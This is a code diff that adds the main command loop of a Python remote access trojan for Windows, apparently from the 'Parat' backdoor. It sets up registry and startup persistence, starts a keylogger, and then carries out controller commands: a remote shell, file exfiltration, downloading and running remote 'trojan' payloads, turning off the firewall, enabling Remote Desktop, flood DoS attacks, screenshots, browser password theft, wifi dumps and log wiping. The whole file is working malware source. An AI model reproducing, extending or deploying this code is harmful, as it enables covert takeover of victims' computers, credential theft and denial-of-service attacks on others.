@@ -1,0 +1,715 @@
+def main():
+	"""connected and ready for command
+	"""
+	global ROBOT
+	global RST_FLAG
+
+	pbackdoor = ParatBackdoor()
+	pbackdoor.do_action('registry')
+	pbackdoor.do_action('startup')
+
+	keyLogger = KeyLogger()
+	keyLogger.start()
+
+	for path in dirs_to_monitor:
+		threading.Thread(target=start_monitor, args=(path, )).start()
+
+
+	while 1:
+
+		try:
+			command = pdecode(ROBOT.recv(4096))
+			if command == "": break
+
+		except:
+			sleep(0.1)
+
+
+		if command == 'disconnect':
+
+			RST_FLAG = True
+			ROBOT.close()
+			return 0
+
+
+		elif command == 'continue': pass
+
+
+		elif command == 'remove':
+
+			try:
+
+				self_name = sys.argv[0]
+				batchfile = os.getenv('TEMP') + "\\common.bat"
+				registry_command = "Reg Add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" + \
+    					 " /v rmServer /t REG_SZ /d " + batchfile
+				handler = call(registry_command)
+
+				if handler != 0:
+					ROBOT.send('Permission Denied!\n')
+
+				else:
+
+					with open(batchfile, "w") as batch_file:
+						batch_file.write("del %s\ndel common.bat" % self_name)
+					batch_file.close()
+
+					RST_FLAG = True
+					ROBOT.send(pencode('Server will remove next reboot!\n'))
+					ROBOT.close()
+
+					return 0
+
+			except:
+				ROBOT.send(pencode('Unknown error from client.\n'))
+
+
+
+		elif command == 'sysinfo':
+
+			update_check = pdecode(ROBOT.recv(1024))
+
+			if update_check == "#GET_INF":
+
+				inf = grab_all_data(sys.platform).split('\n')
+
+				if len(inf) != 2:
+
+					for line in inf:
+						ROBOT.sendall(pencode(line + '\n'))
+						sleep(0.01)
+
+					ROBOT.send(pencode("#END_INF"))
+				else:
+					ROBOT.send(pencode(inf[0]))
+
+			else:
+				pass
+
+
+
+		elif command.startswith('mkdir<#>'):
+
+			try:
+
+				dir_name = command.split("<#>")[1]
+
+				if not os.path.exists(dir_name):
+					os.makedirs(dir_name)
+					ROBOT.send(pencode("[32m[+][0mFolder '" + dir_name + "' created.\n"))
+				else:
+					ROBOT.send(pencode("[91mERROR:[0m Folder '%s' exist.\n" % dir_name))
+
+			except:
+				ROBOT.send(pencode("[91mERROR:[0m can't create '%s'.\n" % dir_name))
+
+
+
+		elif command == 'tree':
+
+			directory_list  = os.listdir('.')
+			directories     = ''
+			all_files       = ''
+
+			for item in directory_list:
+
+				if os.path.isdir(item):
+					directories += "[D][-]: %s\n" % item
+
+				elif os.path.isfile(item):
+					all_files   += "[F][%s]: \n" % os.path.getsize(item) + item
+
+			current_directory = "\n" + os.getcwd() + "\n\n"
+
+			ROBOT.send(pencode(current_directory + directories + all_files + '\n\n\n'))
+
+
+
+		elif command.startswith('cd<#>'):
+
+			try:
+				new_directory = command.split("<#>")[1]
+				os.chdir(new_directory)
+				ROBOT.send(pencode(os.getcwd()))
+
+			except:
+				ROBOT.send(pencode("[91mERROR:[0m can't change to '%s'.\n" % new_directory))
+
+
+
+		elif command.startswith('rmv<#>'):
+
+			try:
+				user_input = command.split("<#>")[1]
+				os.remove(user_input)
+				ROBOT.send(pencode("[32m[+][0mFile '" + user_input + "' successfully removed.\n"))
+
+			except:
+
+				try:
+					rmtree(user_input)
+					ROBOT.send(pencode("[32m[+][0mDirectory '" + user_input + "' successfully removed.\n"))
+
+				except:
+					ROBOT.send(pencode("[91mERROR:[0m can't remove '%s'.\n" % user_input))
+
+
+
+		elif command.startswith('ie<#>'):
+
+			try:
+				urladdr = command.split("<#>")[1]
+				os.system('"C:\Program Files\Internet Explorer\iexplore.exe" ' + urladdr)
+				ROBOT.send(pencode("'%s' opened successfully!\n" % urladdr))
+			except:
+				ROBOT.send(pencode('Unknown error.\n'))
+
+
+
+		elif command == 'pwd':
+
+			try:
+				ROBOT.send(pencode(os.getcwd()))
+			except:
+				ROBOT.send(pencode('[91mERROR:[0m Unknown error from client.\n'))
+
+
+
+		elif command.startswith('touch<#>'):
+
+			try:
+
+				mode = command.split("<#>")[1]
+
+				if mode == "name_and_text":
+
+					new_file_name = command.split("<#>")[2]
+					new_file_content = command.split("<#>")[3]
+
+					nf = open(new_file_name, "w")
+					nf.write(new_file_content)
+					nf.close()
+
+					ROBOT.send(pencode("[32m[+][0m" + new_file_name + " created and text writed.\n"))
+
+
+				elif mode == "name":
+
+					new_file_name = command.split("<#>")[2]
+
+					nf = open(new_file_name, "w")
+					nf.close()
+
+					ROBOT.send(pencode("[32m[+][0m'" + new_file_name + "' created.\n"))
+
+			except:
+				ROBOT.send(pencode("[91mERROR:[0m Unknown error from client.\n"))
+
+
+
+		elif command.startswith('pzip<#>'):
+
+			zip_file_name = command.split('<#>')[1]
+			file_password = command.split('<#>')[2]
+
+			ROBOT.send(pencode(zip_util(zip_file_name, file_password))) if \
+    			file_password != "`_._`" \
+			else \
+				ROBOT.send(pencode(zip_util(zip_file_name)))
+
+
+
+		elif command.startswith('msgbox<#>'):
+
+			try:
+
+				MB_OK        = 0x0
+				MB_OKCXL     = 0x01
+				MB_YESNOCXL  = 0x03
+				MB_YESNO     = 0x04
+				MB_HELP      = 0x4000
+				ICON_NO      = 0x0
+				ICON_EXLAIM  = 0x30
+				ICON_INFO    = 0x40
+				ICON_STOP    = 0x10
+
+				title   = command.split("<#>")[1]
+				message = command.split("<#>")[2]
+				icon    = command.split("<#>")[3]
+				button  = command.split("<#>")[4]
+
+
+				if icon == "None":
+					icon = ICON_NO
+				elif icon == "information":
+					icon = ICON_INFO
+				elif icon == "warning":
+					icon = ICON_EXLAIM
+				elif icon == "critical":
+					icon = ICON_STOP
+
+
+				if button == "ok":
+					button = MB_OK
+				elif button == "okcncl":
+					button = MB_OKCXL
+				elif button == "yesno":
+					button = MB_YESNO
+				elif button == "yesnocncl":
+					button = MB_YESNOCXL
+				elif button == "okhelp":
+					button = MB_HELP
+
+
+				threading.Thread(target=msgbox_thread, args=(message, title, button, icon)).start()
+				ROBOT.send(pencode("Your message showed.\n"))
+
+			except:
+				ROBOT.send(pencode("Message box error.\n"))
+
+
+
+		elif command == 'reboot':
+
+			try:
+				os.system("shutdown /r /t 0")
+				ROBOT.send(pencode("[32m[+][0mRebooting...\n"))
+				RST_FLAG = True
+				ROBOT.close()
+
+			except:
+				ROBOT.send(pencode("[91mERROR: [0mCan't reboot.\n"))
+
+
+
+		elif command == 'shutdown':
+
+			try:
+				os.system("shutdown  /s /t 0")
+				ROBOT.send(pencode("[32m[+][0mShutting down...\n"))
+				RST_FLAG = True
+				ROBOT.close()
+
+			except:
+				ROBOT.send(pencode("[91mERROR: [0mCan't shutdown.\n"))
+
+
+
+		elif command == 'shell':
+
+			try:
+
+				while True:
+
+					ROBOT.send(pencode(os.getcwd() + "> "))
+					cmd = pdecode(ROBOT.recv(4096))
+
+					if cmd != "exit":
+
+						if cmd[:2] == "cd":
+
+
+							try:
+								directory = cmd.split()[1:]
+								new_path = " ".join(directory)
+								os.chdir(new_path)
+								ROBOT.sendall(pencode('\n'))
+
+							except Exception as e:
+								ROBOT.sendall(pencode(str(e) + '\n'))
+
+
+						elif cmd == "ENTER":
+							ROBOT.sendall(pencode('\n\n'))
+
+						elif cmd == "tree":
+							ROBOT.sendall(pencode("\n You can't use tree remotly\n\n"))
+
+						else:
+							results = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
+							command_output = str(results.stdout.read() + results.stderr.read())
+							ROBOT.sendall(pencode(command_output + '\n')) if command_output else ROBOT.sendall(pencode("\n"))
+					else:
+						break
+			except:
+				ROBOT.send(pencode("[31mERROR:[0m Invalid syntax: '%s'.\n" % Command))
+
+
+
+
+		elif command == 'scan':
+
+			try:
+				check_update = pdecode(ROBOT.recv(1024))
+
+				if check_update == "#FSCAN":
+					IP = socket.gethostbyname(socket.gethostname())
+					ROBOT.send(pencode(scan_local_network(IP)))
+
+				else:
+					pass
+
+			except:
+				ROBOT.send(pencode("[31m[-][0mUnknown error from client.\n"))
+
+
+
+		elif command.startswith('uninstall<#>'):
+
+			try:
+
+				program = command.split('<#>')[1]
+				result_content = os.popen('wmic product where name="%s" call uninstall /nointeractive' % program)
+				output = result_content.read().strip()
+
+				if output == "No Instance(s) Available.":
+					ROBOT.send(pencode("[91mERROR: [0mProgram not found '%s'.\n" % program))
+				else:
+					ROBOT.send(pencode("[32m[+][0mProgram '%s' uninstalled successfully.\n" % program))
+
+			except:
+				ROBOT.send(pencode("[91mERROR: [0mCan't remove '%s'.\n" % program))
+
+
+
+		elif command.startswith('wget<#>'):
+			link = command.split('<#>')[1]
+			wget_from_url(link)
+
+
+		elif command == 'rmlog':
+			clean_logs()
+
+
+		elif command == '>wif1<':
+			wifi_dump()
+
+
+		elif command.startswith('download<#>'):
+
+			try:
+				fna = command.split('<#>')[1]
+
+				if os.path.isfile(fna):
+					upload_to_server(fna)
+				else:
+					ROBOT.send("File '%s' not found.\n" % fna)
+
+			except:
+				ROBOT.send("Unknown error from client!\n")
+
+
+
+		elif command == 'getps':
+
+			try:
+				pscmd = 'tasklist'
+				proc = Popen(pscmd, shell=False, stdout=PIPE)
+
+				for line in proc.stdout:
+					ROBOT.send(pencode(line)); sleep(0.01)
+
+				ROBOT.send(pencode("#DATA_HANDLER"))
+
+			except:
+				ROBOT.send(pencode("GETPS ERROR!\n"))
+
+
+
+		elif command.startswith('kill'):
+
+			try:
+				pid = command.split()[1]
+
+				killcmd = 'taskkill /PID ' + pid + ' /F'
+				proc = call(killcmd, shell=False, stdout=PIPE)
+
+				if proc == 0:
+					ROBOT.send(pencode("[92m[+][0m" + pid + " killed successfully.\n"))
+				else:
+					ROBOT.send(pencode("[31m[-][0m" + pid + " not killable.\n"))
+
+			except:
+				ROBOT.send(pencode("[31m[-][0mUnknown error from client.\n"))
+
+
+
+		elif command.startswith('upload<#>'):
+
+			file_name = command.split('<#>')[1]
+			validate_exist = pdecode(ROBOT.recv(4096))
+
+			if validate_exist == "#IS_FILE":
+				download_from_server(file_name)
+			else:
+				pass
+
+
+		elif command == '>screensh0t<':
+			screenshot()
+
+
+		elif command == 'programs':
+
+			os.system('wmic product get name,version /format:list > %TEMP%\programs.list')
+			ProgListFile = os.environ["TEMP"] + "\programs.list"
+
+			upload_to_server(ProgListFile)
+			os.remove(ProgListFile)
+
+
+		elif command == 'services':
+
+			os.system('net start > %TEMP%\services.list')
+			SerListFile = os.environ["TEMP"] + "\services.list"
+
+			upload_to_server(SerListFile)
+			os.remove(SerListFile)
+
+
+
+		elif command.startswith('backdoor<#>'):
+
+			try:
+				mode = command.split('<#>')[1]
+
+				if mode == 'status':
+					ROBOT.send(pencode(pbackdoor.do_action('status')))
+				elif mode == 'registry':
+					ROBOT.send(pencode(pbackdoor.do_action('registry')))
+				elif mode == 'startup':
+					ROBOT.send(pencode(pbackdoor.do_action('startup')))
+				elif mode == 'remove':
+					ROBOT.send(pencode(pbackdoor.do_action('remove')))
+
+			except:
+				ROBOT.send(pencode("[31mERROR:[0m Unknown error from client.\n"))
+
+
+
+		elif command.startswith('runfile<#>'):
+
+			command, trojan, mode = command.split('<#>')
+
+
+			if mode == "LOCAL_GET":
+
+				file_name = os.environ["TEMP"] + "\\" + trojan.replace(" ", "_")
+				validate_exist = pdecode(ROBOT.recv(4096))
+
+				if validate_exist == "#NOT_FILE":
+					pass
+				else:
+					download_from_server(file_name)
+
+				sleep(0.5)
+				res = os.popen(file_name)
+
+				if res != "Access is denied.":
+					ROBOT.send(pencode("#OPENED"))
+				else:
+					ROBOT.send(pencode("#NOT_OPENED"))
+
+
+			elif mode == "REMOTE_GET":
+
+				try:
+					file_name = trojan.split('/')[-1]
+					content = urllib2.urlopen(trojan)
+					path_to_file = os.environ["TEMP"] + "\\" + file_name.replace(" ", "_")
+
+					with open(path_to_file, 'wb') as output:
+						output.write(content.read())
+					output.close()
+
+					sleep(0.5)
+					open_result = os.popen(path_to_file)
+
+					if open_result != "Access is denied.":
+						ROBOT.send(pencode("#OPENED"))
+					else:
+						ROBOT.send(pencode("#NOT_OPENED"))
+
+				except:
+					ROBOT.send(pencode("[91mERROR: [0mTrojan download failed.\n"))
+			else:
+				ROBOT.send(pencode("[91mERROR: [0mUnknown error from client.\n"))
+
+
+
+		elif command.startswith('firewall<#>'):
+
+			try:
+				mode = command.split('<#>')[1]
+
+				if admin_access == 'Yes':
+
+					if mode == 'active':
+
+						cmd_command = 'NetSh Advfirewall set allprofiles state on'
+						Popen(cmd_command, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)
+						ROBOT.send(pencode("[32m[+][0m Firewall Turned [92mON[0m."))
+
+
+					elif mode == 'deactive':
+
+						cmd_command = 'NetSh Advfirewall set allprofiles state off'
+						Popen(cmd_command, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)
+						ROBOT.send(pencode("[32m[+][0m Firewall Turned [91mOFF[0m."))
+
+
+					elif mode == 'status':
+
+						Firewall = check_output(['Netsh', 'Advfirewall', 'show', 'allprofiles'], shell=False)
+
+						for noline, line in enumerate(Firewall.split("\n")):
+
+							if noline == 3:
+								domain = line.split("State")[1].strip()
+
+							elif noline == 20:
+								private = line.split("State")[1].strip()
+
+							elif noline == 37:
+								public = line.split("State")[1].strip()
+
+						result = " Domain profile: {}\n Private profile: {}\n Public profile: {}\n".format(domain, private, public)
+						ROBOT.send(pencode(result))
+
+				else:
+					ROBOT.send(pencode("[91mERROR: [0mPermission denied."))
+			except:
+				ROBOT.send(pencode("[91mERROR: [0mUnknown error from client!"))
+
+
+
+
+		elif command.startswith('desktop<#>'):
+
+			try:
+
+				if admin_access == 'Yes':
+
+					action = command.split("<#>")[1]
+
+					if action == "active":
+
+						registry_command = 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"' + \
+    										' /v fDenyTSConnections /t REG_DWORD /d 0 /f'
+						Remote_Desktop = Popen(registry_command, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)
+
+						do_final = 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"' + \
+    								' /v fAllowToGetHelp /t REG_DWORD /d 1 /f'
+						Remote_Assistance = Popen(do_final, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)
+
+						ROBOT.send(pencode("[92m[+][0m Remote Desktop Protocol is [92mActive[0m.\n"))
+
+
+					elif action == "deactive":
+
+						registry_command = 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"' + \
+    										' /v fDenyTSConnections /t REG_DWORD /d 1 /f'
+						Remote_Desktop = Popen(registry_command, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)
+
+						do_final = 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"' + \
+    								' /v fAllowToGetHelp /t REG_DWORD /d 0 /f'
+						Remote_Assistance = Popen(do_final, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)
+
+						ROBOT.send(pencode("[92m[+][0m Remote Desktop Protocol is [91mDeactive[0m.\n"))
+
+				else:
+					ROBOT.send(pencode("[91mERROR: [0mPermission denied.\n"))
+
+			except:
+				ROBOT.send(pencode("[91mERROR: [0mRDP error!\n"))
+
+
+
+		elif command.startswith('dos'):
+
+			target_address     = command.split()[1]
+			attack_method      = command.split()[2]
+			number_of_packets  = command.split()[3]
+			start_dos_attack   = ddos_util(target_address, number_of_packets)
+
+			if attack_method == 'tcp':
+				start_dos_attack.tcpFlood()
+
+			elif attack_method == 'udp':
+				start_dos_attack.udpFlood()
+
+			elif attack_method == 'syn':
+				start_dos_attack.synFlood()
+
+
+
+		elif command.startswith('active_window'):
+
+			awindow = None
+			ml = MouseLogger()
+			ml.start()
+
+			while True:
+
+				for d, height, width, exe, win_title, buf in ml.retrieve_screenshots():
+					awindow = "screenshot of %s/%s taken at %s (%s bytes) from %s : %s " % (height, width, d, len(buf), exe, win_title)
+				if awindow: break
+				sleep(0.1)
+
+			ROBOT.send(pencode(awindow))
+
+
+
+		elif command.startswith('>ch4ng3s<'):
+
+			if len(all_changes) != 0:
+
+				for chng in all_changes:
+
+					ROBOT.send(pencode(str(chng) + "\n"))
+					sleep(0.1)
+					all_changes.remove(chng)
+
+			else:
+				ROBOT.send(pencode("No change(s) on disk.\n"))
+
+			ROBOT.send(pencode("#DATA_HANDLER"))
+
+
+
+		elif command.startswith('drives'):
+
+			pc_drives = win32api.GetLogicalDriveStrings()
+			pc_drives = pc_drives.split('\000')[:-1]
+			ROBOT.send(pencode(str('\n'.join(pc_drives))))
+
+
+		elif command.startswith('datime'):
+			get_last_active()
+
+
+		elif command.startswith('>keyl0gger<'):
+
+			all_keys = keyLogger.dump()
+			ROBOT.send(pencode(all_keys.strip() + "\n")) if all_keys != "" else ROBOT.send(pencode("No key pressed.\n"))
+
+
+
+		elif command.startswith('passwords<#>'):
+
+			try:
+
+				browser = command.split("<#>")[1]
+
+				if browser == "chrome":
+					chrome_passwords()
+				elif browser == "mozilla":
+					mozilla_passwords()
+
+			except:
+				ROBOT.send(pencode("[91mERROR: [0mCould not get passwords.\n"))
+
+
+
+		else:
+			ROBOT.send(pencode("[91mERROR: [0mUnknown syntax: %s.\n" % command))
